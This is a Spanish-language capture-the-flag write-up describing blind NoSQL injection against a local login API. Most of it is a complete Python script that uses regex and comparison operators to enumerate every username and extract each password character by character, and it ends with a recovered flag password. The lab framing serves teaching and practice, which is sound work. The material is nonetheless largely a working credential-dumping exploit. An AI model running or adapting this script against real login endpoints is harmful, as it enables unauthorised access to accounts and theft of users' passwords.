# Flag 2

Para esta bandera tendremos que extraer las credenciales de la base de datos de nuestros usuarios. Si bien loguearse es una tarea sencilla, extraer la contraseña es una tarea que tiene que hacerse mediante una inyección blind, esto requiere de lo siguiente:

1. Poder saber cuando acertamos y cuando no -> True o False
2. Algún tipo de expresiones regulares para agilizar el proceso

De este modo podemos crear un script que nos automatice la inyección y podamos sacar todos los datos. Empezamos por ejemplo con una función que haga una petición y nos devuelva si la petición funcionó y dejo loguearse al usuario o no, y en cualquier caso devuelva el resultado. Para esto nos podemos ayudar del módulo requests.

  ```python
  # Check if request worked
  def is_valid(result):
      if result.status_code == 200:
          content = result.json()
          if content['sucess']:
              return True
      return False


  # Make a API call
  def inject_payload(payload):
      res = requests.post(
          method + base_url + ':' + port + path,
          headers={'content-type': 'application/json'},
          data=json.dumps(payload),
          proxies=get_proxies(),
          verify=False
      )
      return is_valid(res), res
  ```

  Está función simplemente devuelve una tupla que nos indica si el login fué correcto y nos devuelve el objeto que contiene la respuesta.

A continuación podemos hacer una función que obtenga la contraseña de un usuario:

  ```python
  # Dump user password
  # TODO: This crashes when user don't exists
  def dump_password(user):
      orig = {'user': user, 'pass': 'admin'}
      print('Trying to dump ' + user + ' password')

      exit = False
      length = 1
      password = ''

      while not exit:
          payload = orig.copy()
          payload['pass'] = {"$regex": '^' + '.' * length + '$'}
          bool, res = inject_payload(payload)
          if bool:
              exit = True
          else:
              length += 1

      print('  - Password length: ' + str(length))

      for i in range(0, length):
          payload = orig.copy()
          for c in chars:
              payload['pass'] = {"$regex": '^' + password + c + '.' * (length - 1) + '$'}
              bool, res = inject_payload(payload)
              if bool:
                  password += c
                  length -= 1
                  break

      print('  - Password cracked: ' + password)
      return password
  ```

  1. La primera parte de la función obtiene la longitud de la contraseña usando expresiones regulares, simplemente va añadiendo '.' a la regex hasta que coincide en longitud.

  2. La segunda parte va obteniendo uno a uno todos los caracteres de la contraseña de derecha a izquierda usando expresiones regulares también.

  * Con el objetivo de que esta función sea muy general le pondremos un parámetro que indica a partir de que string empezamos a buscar, de manera que si le damos una string como 'adm' partirá de dicha string siendo esta inmutable (Lo cual significa que entra en bucle infinito si no existe un usuario que empiece por 'adm', esto es algo a tener en cuenta a la hora de llamar a esta función)

Con esto ya nos queda simplemente sacar los usuarios, para ello vamos a escribir funciones de manera que sea sencillo iterar sobre todos los usuarios:

  1. Una función que nos devuelva el primer usuario, que será muy similar a la función de obtener contraseña de un usuario

  2. Una función que obtenga el usuario siguiente al actual:

  ```python
  # Function that gets next user:
  def next_user(prev):
      orig = {'user': {"$regex": '^.*$'}, 'pass': {"$gt": 0}}
      # print('Trying to get first user')

      nexit = True
      user = ''
      correct = False
      length = len(prev) - 1

      while nexit and length >= 0:
          # print(' - Explore: ' + prev[0:length])
          chars.index(prev[length])
          subset = chars[(chars.index(prev[length]) + 1):]
          payload = orig.copy()

          # Is possible to be in the solution now?
          payload['user'] = {"$regex": '^' + prev[0:length] + '$'}
          correct, res = inject_payload(payload)
          if correct:
              # print('  - Next user is: ' + prev[0:length])
              return prev[0:length]

          for c in subset:
              payload['user'] = {"$regex": '^' + prev[0:length] + c + '.*$'}
              correct, res = inject_payload(payload)
              if correct:
                  user = prev[0:length] + c
                  break
          if correct:
              nexit = False
          length -= 1

      if user:
          return first_user(user)
      else:
          return None
  ```

  Partiendo de una string inicial, supongamos dos usuarios: admin y admon, la ejecución de la función sería algo similar a esto:

  ```
  next_user('admin')
    admiñ, admio, admip, admir ...
    admj, admk, adml ... admo
    firt_user(admo)
      admoa, admob, admoc ... admon
  ```

El resultado de juntar todos los trozos de código que hemos ido haciendo es el siguiente:

```python
# coding=utf-8
import json
import requests

method = 'http://'
base_url = 'localhost'
port = '1337'
path = '/api/users/login'
payload_type = 'json'
parameters = ['user', 'pass']
payloads = [{'$gt': 0}]
# TODO: Problem with ^, $, ?, \, +, ., ~, |, {, } and *
chars = 'abcdefghijklmnñopqrstuvwxyzABCDEFGHIJKLMNÑOPQRSTUVWXYZ1234567890 !"#%&\'(),-/:;<=>@[]_`'


# For view the api calls in burp
def get_proxies(host='127.0.0.1', port='8080'):
    proxies = {
        'http': 'http://%s:%s' % (host, port),
        'https': 'https://%s:%s' % (host, port)
    }
    #return proxies
    return None


# Check if request worked
def is_valid(result):
    if result.status_code == 200:
        content = result.json()
        if content['sucess']:
            return True
    return False


# Make a API call
def inject_payload(payload):
    res = requests.post(
        method + base_url + ':' + port + path,
        headers={'content-type': 'application/json'},
        data=json.dumps(payload),
        proxies=get_proxies(),
        verify=False
    )
    return is_valid(res), res


# Check if injection is working
def check_injection(parameters, original_values):
    orig = generatedata(parameters, original_values)
    print('Testing NOSQL inyection...')

    for p in parameters:
        payload = orig.copy()
        payload[p] = payloads[0]
        valid = inject_payload(payload)
        if valid:
            print('  - Seems that parameter: <' + p + '> IS vulnerable')
        else:
            print('  - Seems that parameter: <' + p + '> IS NOT vulnerable')


# Dump user password
# TODO: This crashes when user don't exists
def dump_password(user):
    orig = {'user': user, 'pass': 'admin'}
    print('Trying to dump ' + user + ' password')

    exit = False
    length = 1
    password = ''

    while not exit:
        payload = orig.copy()
        payload['pass'] = {"$regex": '^' + '.' * length + '$'}
        bool, res = inject_payload(payload)
        if bool:
            exit = True
        else:
            length += 1

    print('  - Password length: ' + str(length))

    for i in range(0, length):
        payload = orig.copy()
        for c in chars:
            payload['pass'] = {"$regex": '^' + password + c + '.' * (length - 1) + '$'}
            bool, res = inject_payload(payload)
            if bool:
                password += c
                length -= 1
                break

    print('  - Password cracked: ' + password)
    return password


# Function that gets first user:
def first_user(start=None):
    orig = {'user': {"$regex": '^.*$'}, 'pass': {"$gt": 0}}
    # print('Trying to get first user')

    nexit = True
    user = ''
    if start:
        user = start
    correct = False

    while nexit:
        payload = orig.copy()
        for c in chars:
            payload['user'] = {"$regex": '^' + user + c + '.*$'}
            correct, res = inject_payload(payload)
            if correct:
                user += c
                break
        if not correct:
            nexit = False

    # print('  - Got the user: ' + user)
    return user


# Function that gets next user:
def next_user(prev):
    orig = {'user': {"$regex": '^.*$'}, 'pass': {"$gt": 0}}
    # print('Trying to get first user')

    nexit = True
    user = ''
    correct = False
    length = len(prev) - 1

    while nexit and length >= 0:
        # print(' - Explore: ' + prev[0:length])
        chars.index(prev[length])
        subset = chars[(chars.index(prev[length]) + 1):]
        payload = orig.copy()

        # Is possible to be in the solution now?
        payload['user'] = {"$regex": '^' + prev[0:length] + '$'}
        correct, res = inject_payload(payload)
        if correct:
            # print('  - Next user is: ' + prev[0:length])
            return prev[0:length]

        for c in subset:
            payload['user'] = {"$regex": '^' + prev[0:length] + c + '.*$'}
            correct, res = inject_payload(payload)
            if correct:
                user = prev[0:length] + c
                break
        if correct:
            nexit = False
        length -= 1

    if user:
        return first_user(user)
    else:
        return None


# Dumps users
def dump_users():
    users = []

    print('Trying to dump users')

    user = first_user()
    if user:
        print('  - ' + user)
        users.append(user)

    user = next_user(users[-1])
    if user:
        print('  - ' + user)
        users.append(user)
        while (user):
            user = next_user(users[-1])
            if user:
                print('  - ' + user)
                users.append(user)

    return users


def dump_database():
    users = dump_users()
    for u in users:
        dump_password(u)


if __name__ == '__main__':
    dump_database()
```

Con esto podremos obtener todos los usuarios de la base de datos y sus contraseñas, obteniendo así la segunda flag:

```
Trying to dump flag password
  - Password length: 12
  - Password cracked: y4Grq#nU%!PG
```
